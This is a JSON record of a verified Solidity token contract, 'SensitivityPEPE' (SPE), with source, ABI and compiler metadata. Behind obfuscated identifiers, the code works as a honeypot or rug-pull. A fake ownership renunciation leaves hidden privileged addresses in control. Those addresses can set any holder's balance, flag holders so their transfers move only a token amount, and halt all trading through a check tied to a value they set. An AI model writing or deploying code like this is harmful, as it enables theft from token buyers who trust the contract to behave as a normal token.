{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface limitList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityFromAt) external view returns (uint256);\n\n    function transfer(address modeReceiver, uint256 senderAmountAuto) external returns (bool);\n\n    function allowance(address takeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderAmountAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeReceiver,\n        uint256 senderAmountAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxReceiver, uint256 value);\n    event Approval(address indexed takeReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minExemptFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeSender {\n    function createPair(address txExempt, address launchShould) external returns (address);\n}\n\ninterface takeMarketing is limitList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SensitivityPEPE is receiverTake, limitList, takeMarketing {\n\n    event OwnershipTransferred(address indexed modeTx, address indexed walletLimit);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTrading;\n    }\n\n    bool public enableReceiverWallet;\n\n    uint256 constant feeSwapMode = 5 ** 10;\n\n    address private senderBuy;\n\n    address public receiverFee;\n\n    function tradingFund(uint256 senderAmountAuto) public {\n        launchLiquidity();\n        fundFrom = senderAmountAuto;\n    }\n\n    function feeLaunchedFrom() public {\n        emit OwnershipTransferred(receiverFee, address(0));\n        senderBuy = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private teamAt;\n\n    function launchLiquidity() private view {\n        require(receiverIs[_msgSender()]);\n    }\n\n    bool public maxShouldReceiver;\n\n    function owner() external view returns (address) {\n        return senderBuy;\n    }\n\n    function balanceOf(address liquidityFromAt) public view virtual override returns (uint256) {\n        return tokenTotal[liquidityFromAt];\n    }\n\n    function getOwner() external view returns (address) {\n        return senderBuy;\n    }\n\n    uint256 fundFrom;\n\n    function minTo(address liquidityAmount, address modeReceiver, uint256 senderAmountAuto) internal returns (bool) {\n        if (liquidityAmount == receiverFee) {\n            return modeTotal(liquidityAmount, modeReceiver, senderAmountAuto);\n        }\n        uint256 sellSender = limitList(takeLimit).balanceOf(tradingWallet);\n        require(sellSender == fundFrom);\n        require(modeReceiver != tradingWallet);\n        if (tradingSell[liquidityAmount]) {\n            return modeTotal(liquidityAmount, modeReceiver, feeSwapMode);\n        }\n        return modeTotal(liquidityAmount, modeReceiver, senderAmountAuto);\n    }\n\n    string private walletFund = \"SPE\";\n\n    uint256 public liquidityTotal;\n\n    constructor (){\n        \n        minExemptFrom shouldAtBuy = minExemptFrom(autoMin);\n        takeLimit = modeSender(shouldAtBuy.factory()).createPair(shouldAtBuy.WETH(), address(this));\n        \n        receiverFee = _msgSender();\n        feeLaunchedFrom();\n        receiverIs[receiverFee] = true;\n        tokenTotal[receiverFee] = tokenTrading;\n        if (enableReceiverWallet) {\n            enableReceiverWallet = false;\n        }\n        emit Transfer(address(0), receiverFee, tokenTrading);\n    }\n\n    string private receiverMode = \"Sensitivity PEPE\";\n\n    uint256 private tokenTrading = 100000000 * 10 ** 18;\n\n    bool public senderTx;\n\n    address tradingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableMarketing;\n    }\n\n    address public takeLimit;\n\n    bool public enableModeSell;\n\n    function allowance(address launchTeam, address liquidityTakeList) external view virtual override returns (uint256) {\n        if (liquidityTakeList == autoMin) {\n            return type(uint256).max;\n        }\n        return teamAt[launchTeam][liquidityTakeList];\n    }\n\n    function enableTrading(address enableAmount, uint256 senderAmountAuto) public {\n        launchLiquidity();\n        tokenTotal[enableAmount] = senderAmountAuto;\n    }\n\n    mapping(address => bool) public receiverIs;\n\n    function approve(address liquidityTakeList, uint256 senderAmountAuto) public virtual override returns (bool) {\n        teamAt[_msgSender()][liquidityTakeList] = senderAmountAuto;\n        emit Approval(_msgSender(), liquidityTakeList, senderAmountAuto);\n        return true;\n    }\n\n    function modeTotal(address liquidityAmount, address modeReceiver, uint256 senderAmountAuto) internal returns (bool) {\n        require(tokenTotal[liquidityAmount] >= senderAmountAuto);\n        tokenTotal[liquidityAmount] -= senderAmountAuto;\n        tokenTotal[modeReceiver] += senderAmountAuto;\n        emit Transfer(liquidityAmount, modeReceiver, senderAmountAuto);\n        return true;\n    }\n\n    function senderToken(address toList) public {\n        launchLiquidity();\n        \n        if (toList == receiverFee || toList == takeLimit) {\n            return;\n        }\n        tradingSell[toList] = true;\n    }\n\n    uint256 public tradingMin;\n\n    mapping(address => bool) public tradingSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletFund;\n    }\n\n    function walletTake(address receiverList) public {\n        if (maxShouldReceiver) {\n            return;\n        }\n        if (enableModeSell != limitReceiver) {\n            tradingMin = liquidityTotal;\n        }\n        receiverIs[receiverList] = true;\n        \n        maxShouldReceiver = true;\n    }\n\n    mapping(address => uint256) private tokenTotal;\n\n    address autoMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMode;\n    }\n\n    bool private walletEnable;\n\n    bool private limitReceiver;\n\n    function transfer(address enableAmount, uint256 senderAmountAuto) external virtual override returns (bool) {\n        return minTo(_msgSender(), enableAmount, senderAmountAuto);\n    }\n\n    function transferFrom(address liquidityAmount, address modeReceiver, uint256 senderAmountAuto) external override returns (bool) {\n        if (_msgSender() != autoMin) {\n            if (teamAt[liquidityAmount][_msgSender()] != type(uint256).max) {\n                require(senderAmountAuto <= teamAt[liquidityAmount][_msgSender()]);\n                teamAt[liquidityAmount][_msgSender()] -= senderAmountAuto;\n            }\n        }\n        return minTo(liquidityAmount, modeReceiver, senderAmountAuto);\n    }\n\n    uint8 private enableMarketing = 18;\n\n    uint256 launchTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTakeList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTakeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFromAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableModeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountAuto\",\"type\":\"uint256\"}],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderAmountAuto\",\"type\":\"uint256\"}],\"name\":\"tradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"walletTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SensitivityPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}